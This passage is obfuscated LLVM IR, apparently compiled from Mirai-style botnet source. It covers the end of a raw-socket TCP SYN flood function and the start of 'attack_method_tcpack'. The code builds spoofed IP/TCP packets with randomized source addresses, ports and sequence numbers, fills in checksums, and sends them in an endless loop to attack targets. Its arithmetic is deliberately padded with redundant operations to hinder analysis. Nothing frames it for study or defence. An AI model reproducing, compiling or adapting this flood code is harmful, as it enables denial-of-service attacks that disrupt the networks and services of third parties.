  %125 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.tcphdr*
  store %struct.tcphdr* %127, %struct.tcphdr** %28, align 8
  %128 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %129 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %128, i64 1
  %130 = bitcast %struct.tcphdr* %129 to i8*
  store i8* %130, i8** %29, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %132 = bitcast %struct.iphdr* %131 to i8*
  %133 = load i8, i8* %132, align 4
  %134 = xor i8 %133, -1
  %135 = xor i8 15, -1
  %136 = xor i8 -58, -1
  %137 = or i8 %134, %135
  %138 = or i8 -58, %136
  %139 = xor i8 %137, -1
  %140 = and i8 %139, %138
  %141 = and i8 %133, 15
  %142 = xor i8 %140, -1
  %143 = xor i8 64, -1
  %144 = xor i8 24, -1
  %145 = and i8 %142, 24
  %146 = and i8 %140, %144
  %147 = and i8 %143, 24
  %148 = and i8 64, %144
  %149 = or i8 %145, %146
  %150 = or i8 %147, %148
  %151 = xor i8 %149, %150
  %152 = or i8 %142, %143
  %153 = xor i8 %152, -1
  %154 = or i8 24, %144
  %155 = and i8 %153, %154
  %156 = or i8 %151, %155
  %157 = or i8 %140, 64
  store i8 %156, i8* %132, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = load i8, i8* %159, align 4
  %161 = xor i8 -16, -1
  %162 = xor i8 %160, %161
  %163 = and i8 %162, %160
  %164 = and i8 %160, -16
  %165 = xor i8 %163, -1
  %166 = xor i8 5, -1
  %167 = xor i8 100, -1
  %168 = and i8 %165, 100
  %169 = and i8 %163, %167
  %170 = and i8 %166, 100
  %171 = and i8 5, %167
  %172 = or i8 %168, %169
  %173 = or i8 %170, %171
  %174 = xor i8 %172, %173
  %175 = or i8 %165, %166
  %176 = xor i8 %175, -1
  %177 = or i8 100, %167
  %178 = and i8 %176, %177
  %179 = or i8 %174, %178
  %180 = or i8 %163, 5
  store i8 %179, i8* %159, align 4
  %181 = load i8, i8* %12, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 1
  store i8 %181, i8* %183, align 1
  %184 = call zeroext i16 @htons(i16 zeroext 60) #7
  %185 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i32 0, i32 2
  store i16 %184, i16* %186, align 2
  %187 = load i16, i16* %13, align 2
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 3
  store i16 %188, i16* %190, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 5
  store i8 %191, i8* %193, align 4
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  br i1 %195, label %196, label %200

; <label>:196:                                    ; preds = %113
  %197 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 4
  store i16 %197, i16* %199, align 2
  br label %200

; <label>:200:                                    ; preds = %196, %113
  %201 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 6
  store i8 6, i8* %202, align 1
  %203 = load i32, i32* %26, align 4
  %204 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 8
  store i32 %203, i32* %205, align 4
  %206 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %207 = load i32, i32* %9, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i64 %208
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i32 0, i32 1
  %211 = load i32, i32* %210, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 9
  store i32 %211, i32* %213, align 4
  %214 = load i16, i16* %16, align 2
  %215 = call zeroext i16 @htons(i16 zeroext %214) #7
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 0
  store i16 %215, i16* %217, align 4
  %218 = load i16, i16* %17, align 2
  %219 = call zeroext i16 @htons(i16 zeroext %218) #7
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 1
  store i16 %219, i16* %221, align 2
  %222 = load i32, i32* %18, align 4
  %223 = trunc i32 %222 to i16
  %224 = call zeroext i16 @htons(i16 zeroext %223) #7
  %225 = zext i16 %224 to i32
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 2
  store i32 %225, i32* %227, align 4
  %228 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 4
  %230 = load i16, i16* %229, align 4
  %231 = xor i16 %230, -1
  %232 = xor i16 -241, -1
  %233 = xor i16 -26780, -1
  %234 = or i16 %231, %232
  %235 = or i16 -26780, %233
  %236 = xor i16 %234, -1
  %237 = and i16 %236, %235
  %238 = and i16 %230, -241
  %239 = xor i16 %237, -1
  %240 = xor i16 160, -1
  %241 = xor i16 -12528, -1
  %242 = and i16 %239, -12528
  %243 = and i16 %237, %241
  %244 = and i16 %240, -12528
  %245 = and i16 160, %241
  %246 = or i16 %242, %243
  %247 = or i16 %244, %245
  %248 = xor i16 %246, %247
  %249 = or i16 %239, %240
  %250 = xor i16 %249, -1
  %251 = or i16 -12528, %241
  %252 = and i16 %250, %251
  %253 = or i16 %248, %252
  %254 = or i16 %237, 160
  store i16 %253, i16* %229, align 4
  %255 = load i8, i8* %20, align 1
  %256 = sext i8 %255 to i16
  %257 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %258 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %257, i32 0, i32 4
  %259 = load i16, i16* %258, align 4
  %260 = xor i16 %256, -1
  %261 = xor i16 1, -1
  %262 = xor i16 2715, -1
  %263 = or i16 %260, %261
  %264 = or i16 2715, %262
  %265 = xor i16 %263, -1
  %266 = and i16 %265, %264
  %267 = and i16 %256, 1
  %268 = shl i16 %266, 13
  %269 = xor i16 -8193, -1
  %270 = xor i16 %259, %269
  %271 = and i16 %270, %259
  %272 = and i16 %259, -8193
  %273 = xor i16 %271, -1
  %274 = xor i16 %268, -1
  %275 = xor i16 3618, -1
  %276 = and i16 %273, 3618
  %277 = and i16 %271, %275
  %278 = and i16 %274, 3618
  %279 = and i16 %268, %275
  %280 = or i16 %276, %277
  %281 = or i16 %278, %279
  %282 = xor i16 %280, %281
  %283 = or i16 %273, %274
  %284 = xor i16 %283, -1
  %285 = or i16 3618, %275
  %286 = and i16 %284, %285
  %287 = or i16 %282, %286
  %288 = or i16 %271, %268
  store i16 %287, i16* %258, align 4
  %289 = load i8, i8* %21, align 1
  %290 = sext i8 %289 to i16
  %291 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %292 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %291, i32 0, i32 4
  %293 = load i16, i16* %292, align 4
  %294 = xor i16 %290, -1
  %295 = xor i16 1, -1
  %296 = xor i16 -27468, -1
  %297 = or i16 %294, %295
  %298 = or i16 -27468, %296
  %299 = xor i16 %297, -1
  %300 = and i16 %299, %298
  %301 = and i16 %290, 1
  %302 = shl i16 %300, 12
  %303 = xor i16 %293, -1
  %304 = xor i16 -4097, -1
  %305 = xor i16 -31566, -1
  %306 = or i16 %303, %304
  %307 = or i16 -31566, %305
  %308 = xor i16 %306, -1
  %309 = and i16 %308, %307
  %310 = and i16 %293, -4097
  %311 = xor i16 %309, -1
  %312 = xor i16 %302, -1
  %313 = xor i16 25610, -1
  %314 = and i16 %311, 25610
  %315 = and i16 %309, %313
  %316 = and i16 %312, 25610
  %317 = and i16 %302, %313
  %318 = or i16 %314, %315
  %319 = or i16 %316, %317
  %320 = xor i16 %318, %319
  %321 = or i16 %311, %312
  %322 = xor i16 %321, -1
  %323 = or i16 25610, %313
  %324 = and i16 %322, %323
  %325 = or i16 %320, %324
  %326 = or i16 %309, %302
  store i16 %325, i16* %292, align 4
  %327 = load i8, i8* %22, align 1
  %328 = sext i8 %327 to i16
  %329 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %330 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %329, i32 0, i32 4
  %331 = load i16, i16* %330, align 4
  %332 = xor i16 %328, -1
  %333 = xor i16 1, -1
  %334 = xor i16 24892, -1
  %335 = or i16 %332, %333
  %336 = or i16 24892, %334
  %337 = xor i16 %335, -1
  %338 = and i16 %337, %336
  %339 = and i16 %328, 1
  %340 = shl i16 %338, 11
  %341 = xor i16 -2049, -1
  %342 = xor i16 %331, %341
  %343 = and i16 %342, %331
  %344 = and i16 %331, -2049
  %345 = xor i16 %343, -1
  %346 = xor i16 %340, -1
  %347 = xor i16 -31753, -1
  %348 = and i16 %345, -31753
  %349 = and i16 %343, %347
  %350 = and i16 %346, -31753
  %351 = and i16 %340, %347
  %352 = or i16 %348, %349
  %353 = or i16 %350, %351
  %354 = xor i16 %352, %353
  %355 = or i16 %345, %346
  %356 = xor i16 %355, -1
  %357 = or i16 -31753, %347
  %358 = and i16 %356, %357
  %359 = or i16 %354, %358
  %360 = or i16 %343, %340
  store i16 %359, i16* %330, align 4
  %361 = load i8, i8* %23, align 1
  %362 = sext i8 %361 to i16
  %363 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %364 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 4
  %366 = xor i16 1, -1
  %367 = xor i16 %362, %366
  %368 = and i16 %367, %362
  %369 = and i16 %362, 1
  %370 = shl i16 %368, 10
  %371 = xor i16 -1025, -1
  %372 = xor i16 %365, %371
  %373 = and i16 %372, %365
  %374 = and i16 %365, -1025
  %375 = xor i16 %373, -1
  %376 = xor i16 %370, -1
  %377 = xor i16 23014, -1
  %378 = and i16 %375, 23014
  %379 = and i16 %373, %377
  %380 = and i16 %376, 23014
  %381 = and i16 %370, %377
  %382 = or i16 %378, %379
  %383 = or i16 %380, %381
  %384 = xor i16 %382, %383
  %385 = or i16 %375, %376
  %386 = xor i16 %385, -1
  %387 = or i16 23014, %377
  %388 = and i16 %386, %387
  %389 = or i16 %384, %388
  %390 = or i16 %373, %370
  store i16 %389, i16* %364, align 4
  %391 = load i8, i8* %24, align 1
  %392 = sext i8 %391 to i16
  %393 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %394 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %393, i32 0, i32 4
  %395 = load i16, i16* %394, align 4
  %396 = xor i16 1, -1
  %397 = xor i16 %392, %396
  %398 = and i16 %397, %392
  %399 = and i16 %392, 1
  %400 = shl i16 %398, 9
  %401 = xor i16 %395, -1
  %402 = xor i16 -513, -1
  %403 = xor i16 9162, -1
  %404 = or i16 %401, %402
  %405 = or i16 9162, %403
  %406 = xor i16 %404, -1
  %407 = and i16 %406, %405
  %408 = and i16 %395, -513
  %409 = and i16 %407, %400
  %410 = xor i16 %407, %400
  %411 = or i16 %409, %410
  %412 = or i16 %407, %400
  store i16 %411, i16* %394, align 4
  %413 = load i8, i8* %25, align 1
  %414 = sext i8 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = xor i16 1, -1
  %419 = xor i16 %414, %418
  %420 = and i16 %419, %414
  %421 = and i16 %414, 1
  %422 = shl i16 %420, 8
  %423 = xor i16 %417, -1
  %424 = xor i16 -257, -1
  %425 = xor i16 13986, -1
  %426 = or i16 %423, %424
  %427 = or i16 13986, %425
  %428 = xor i16 %426, -1
  %429 = and i16 %428, %427
  %430 = and i16 %417, -257
  %431 = and i16 %429, %422
  %432 = xor i16 %429, %422
  %433 = or i16 %431, %432
  %434 = or i16 %429, %422
  store i16 %433, i16* %416, align 4
  %435 = load i8*, i8** %29, align 8
  %436 = getelementptr inbounds i8, i8* %435, i32 1
  store i8* %436, i8** %29, align 8
  store i8 2, i8* %435, align 1
  %437 = load i8*, i8** %29, align 8
  %438 = getelementptr inbounds i8, i8* %437, i32 1
  store i8* %438, i8** %29, align 8
  store i8 4, i8* %437, align 1
  %439 = call i32 @rand_next()
  %440 = xor i32 %439, -1
  %441 = xor i32 15, -1
  %442 = xor i32 -1208162141, -1
  %443 = or i32 %440, %441
  %444 = or i32 -1208162141, %442
  %445 = xor i32 %443, -1
  %446 = and i32 %445, %444
  %447 = and i32 %439, 15
  %448 = add i32 1400, 331048388
  %449 = add i32 %448, %446
  %450 = sub i32 %449, 331048388
  %451 = add i32 1400, %446
  %452 = trunc i32 %450 to i16
  %453 = call zeroext i16 @htons(i16 zeroext %452) #7
  %454 = load i8*, i8** %29, align 8
  %455 = bitcast i8* %454 to i16*
  store i16 %453, i16* %455, align 2
  %456 = load i8*, i8** %29, align 8
  %457 = getelementptr inbounds i8, i8* %456, i64 2
  store i8* %457, i8** %29, align 8
  %458 = load i8*, i8** %29, align 8
  %459 = getelementptr inbounds i8, i8* %458, i32 1
  store i8* %459, i8** %29, align 8
  store i8 4, i8* %458, align 1
  %460 = load i8*, i8** %29, align 8
  %461 = getelementptr inbounds i8, i8* %460, i32 1
  store i8* %461, i8** %29, align 8
  store i8 2, i8* %460, align 1
  %462 = load i8*, i8** %29, align 8
  %463 = getelementptr inbounds i8, i8* %462, i32 1
  store i8* %463, i8** %29, align 8
  store i8 8, i8* %462, align 1
  %464 = load i8*, i8** %29, align 8
  %465 = getelementptr inbounds i8, i8* %464, i32 1
  store i8* %465, i8** %29, align 8
  store i8 10, i8* %464, align 1
  %466 = call i32 @rand_next()
  %467 = load i8*, i8** %29, align 8
  %468 = bitcast i8* %467 to i32*
  store i32 %466, i32* %468, align 4
  %469 = load i8*, i8** %29, align 8
  %470 = getelementptr inbounds i8, i8* %469, i64 4
  store i8* %470, i8** %29, align 8
  %471 = load i8*, i8** %29, align 8
  %472 = bitcast i8* %471 to i32*
  store i32 0, i32* %472, align 4
  %473 = load i8*, i8** %29, align 8
  %474 = getelementptr inbounds i8, i8* %473, i64 4
  store i8* %474, i8** %29, align 8
  %475 = load i8*, i8** %29, align 8
  %476 = getelementptr inbounds i8, i8* %475, i32 1
  store i8* %476, i8** %29, align 8
  store i8 1, i8* %475, align 1
  %477 = load i8*, i8** %29, align 8
  %478 = getelementptr inbounds i8, i8* %477, i32 1
  store i8* %478, i8** %29, align 8
  store i8 3, i8* %477, align 1
  %479 = load i8*, i8** %29, align 8
  %480 = getelementptr inbounds i8, i8* %479, i32 1
  store i8* %480, i8** %29, align 8
  store i8 3, i8* %479, align 1
  %481 = load i8*, i8** %29, align 8
  %482 = getelementptr inbounds i8, i8* %481, i32 1
  store i8* %482, i8** %29, align 8
  store i8 6, i8* %481, align 1
  br label %483

; <label>:483:                                    ; preds = %200
  %484 = load i32, i32* %9, align 4
  %485 = sub i32 %484, 98853923
  %486 = add i32 %485, 1
  %487 = add i32 %486, 98853923
  %488 = add nsw i32 %484, 1
  store i32 %487, i32* %9, align 4
  br label %108

; <label>:489:                                    ; preds = %108
  br label %490

; <label>:490:                                    ; preds = %660, %489
  store i32 0, i32* %9, align 4
  br label %491

; <label>:491:                                    ; preds = %653, %490
  %492 = load i32, i32* %9, align 4
  %493 = load i8, i8* %5, align 1
  %494 = zext i8 %493 to i32
  %495 = icmp slt i32 %492, %494
  br i1 %495, label %496, label %660

; <label>:496:                                    ; preds = %491
  %497 = load i8**, i8*** %11, align 8
  %498 = load i32, i32* %9, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds i8*, i8** %497, i64 %499
  %501 = load i8*, i8** %500, align 8
  store i8* %501, i8** %30, align 8
  %502 = load i8*, i8** %30, align 8
  %503 = bitcast i8* %502 to %struct.iphdr*
  store %struct.iphdr* %503, %struct.iphdr** %31, align 8
  %504 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i64 1
  %506 = bitcast %struct.iphdr* %505 to %struct.tcphdr*
  store %struct.tcphdr* %506, %struct.tcphdr** %32, align 8
  %507 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %508 = load i32, i32* %9, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %507, i64 %509
  %511 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %510, i32 0, i32 2
  %512 = load i8, i8* %511, align 4
  %513 = zext i8 %512 to i32
  %514 = icmp slt i32 %513, 32
  br i1 %514, label %515, label %539

; <label>:515:                                    ; preds = %496
  %516 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %517 = load i32, i32* %9, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i64 %518
  %520 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %519, i32 0, i32 1
  %521 = load i32, i32* %520, align 4
  %522 = call i32 @ntohl(i32 %521) #7
  %523 = call i32 @rand_next()
  %524 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %525 = load i32, i32* %9, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %524, i64 %526
  %528 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %527, i32 0, i32 2
  %529 = load i8, i8* %528, align 4
  %530 = zext i8 %529 to i32
  %531 = lshr i32 %523, %530
  %532 = add i32 %522, -408182500
  %533 = add i32 %532, %531
  %534 = sub i32 %533, -408182500
  %535 = add i32 %522, %531
  %536 = call i32 @htonl(i32 %534) #7
  %537 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 9
  store i32 %536, i32* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %515, %496
  %540 = load i32, i32* %26, align 4
  %541 = icmp eq i32 %540, -1
  br i1 %541, label %542, label %546

; <label>:542:                                    ; preds = %539
  %543 = call i32 @rand_next()
  %544 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %545 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %544, i32 0, i32 8
  store i32 %543, i32* %545, align 4
  br label %546

; <label>:546:                                    ; preds = %542, %539
  %547 = load i16, i16* %13, align 2
  %548 = zext i16 %547 to i32
  %549 = icmp eq i32 %548, 65535
  br i1 %549, label %550, label %559

; <label>:550:                                    ; preds = %546
  %551 = call i32 @rand_next()
  %552 = xor i32 65535, -1
  %553 = xor i32 %551, %552
  %554 = and i32 %553, %551
  %555 = and i32 %551, 65535
  %556 = trunc i32 %554 to i16
  %557 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %558 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %557, i32 0, i32 3
  store i16 %556, i16* %558, align 4
  br label %559

; <label>:559:                                    ; preds = %550, %546
  %560 = load i16, i16* %16, align 2
  %561 = zext i16 %560 to i32
  %562 = icmp eq i32 %561, 65535
  br i1 %562, label %563, label %572

; <label>:563:                                    ; preds = %559
  %564 = call i32 @rand_next()
  %565 = xor i32 65535, -1
  %566 = xor i32 %564, %565
  %567 = and i32 %566, %564
  %568 = and i32 %564, 65535
  %569 = trunc i32 %567 to i16
  %570 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %571 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %570, i32 0, i32 0
  store i16 %569, i16* %571, align 4
  br label %572

; <label>:572:                                    ; preds = %563, %559
  %573 = load i16, i16* %17, align 2
  %574 = zext i16 %573 to i32
  %575 = icmp eq i32 %574, 65535
  br i1 %575, label %576, label %589

; <label>:576:                                    ; preds = %572
  %577 = call i32 @rand_next()
  %578 = xor i32 %577, -1
  %579 = xor i32 65535, -1
  %580 = xor i32 -1787019165, -1
  %581 = or i32 %578, %579
  %582 = or i32 -1787019165, %580
  %583 = xor i32 %581, -1
  %584 = and i32 %583, %582
  %585 = and i32 %577, 65535
  %586 = trunc i32 %584 to i16
  %587 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %588 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %587, i32 0, i32 1
  store i16 %586, i16* %588, align 2
  br label %589

; <label>:589:                                    ; preds = %576, %572
  %590 = load i32, i32* %18, align 4
  %591 = icmp eq i32 %590, 65535
  br i1 %591, label %592, label %596

; <label>:592:                                    ; preds = %589
  %593 = call i32 @rand_next()
  %594 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %595 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %594, i32 0, i32 2
  store i32 %593, i32* %595, align 4
  br label %596

; <label>:596:                                    ; preds = %592, %589
  %597 = load i32, i32* %19, align 4
  %598 = icmp eq i32 %597, 65535
  br i1 %598, label %599, label %603

; <label>:599:                                    ; preds = %596
  %600 = call i32 @rand_next()
  %601 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %602 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %601, i32 0, i32 3
  store i32 %600, i32* %602, align 4
  br label %603

; <label>:603:                                    ; preds = %599, %596
  %604 = load i8, i8* %20, align 1
  %605 = icmp ne i8 %604, 0
  br i1 %605, label %606, label %615

; <label>:606:                                    ; preds = %603
  %607 = call i32 @rand_next()
  %608 = xor i32 65535, -1
  %609 = xor i32 %607, %608
  %610 = and i32 %609, %607
  %611 = and i32 %607, 65535
  %612 = trunc i32 %610 to i16
  %613 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %614 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %613, i32 0, i32 7
  store i16 %612, i16* %614, align 2
  br label %615

; <label>:615:                                    ; preds = %606, %603
  %616 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %617 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %616, i32 0, i32 7
  store i16 0, i16* %617, align 2
  %618 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %619 = bitcast %struct.iphdr* %618 to i16*
  %620 = call zeroext i16 @checksum_generic(i16* %619, i32 20)
  %621 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %622 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %621, i32 0, i32 7
  store i16 %620, i16* %622, align 2
  %623 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %624 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %623, i32 0, i32 6
  store i16 0, i16* %624, align 4
  %625 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %626 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %627 = bitcast %struct.tcphdr* %626 to i8*
  %628 = call zeroext i16 @htons(i16 zeroext 40) #7
  %629 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %625, i8* %627, i16 zeroext %628, i32 40)
  %630 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %631 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %630, i32 0, i32 6
  store i16 %629, i16* %631, align 4
  %632 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %633 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %632, i32 0, i32 1
  %634 = load i16, i16* %633, align 2
  %635 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %636 = load i32, i32* %9, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %635, i64 %637
  %639 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %638, i32 0, i32 0
  %640 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %639, i32 0, i32 1
  store i16 %634, i16* %640, align 2
  %641 = load i32, i32* %10, align 4
  %642 = load i8*, i8** %30, align 8
  %643 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %644 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %645 = load i32, i32* %9, align 4
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %644, i64 %646
  %648 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %647, i32 0, i32 0
  %649 = bitcast %struct.sockaddr_in* %648 to %struct.sockaddr*
  store %struct.sockaddr* %649, %struct.sockaddr** %643, align 8
  %650 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %651 = load %struct.sockaddr*, %struct.sockaddr** %650, align 8
  %652 = call i64 @sendto(i32 %641, i8* %642, i64 60, i32 16384, %struct.sockaddr* %651, i32 16)
  br label %653

; <label>:653:                                    ; preds = %615
  %654 = load i32, i32* %9, align 4
  %655 = sub i32 0, %654
  %656 = sub i32 0, 1
  %657 = add i32 %655, %656
  %658 = sub i32 0, %657
  %659 = add nsw i32 %654, 1
  store i32 %658, i32* %9, align 4
  br label %491

; <label>:660:                                    ; preds = %491
  br label %490

; <label>:661:                                    ; preds = %104, %98
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
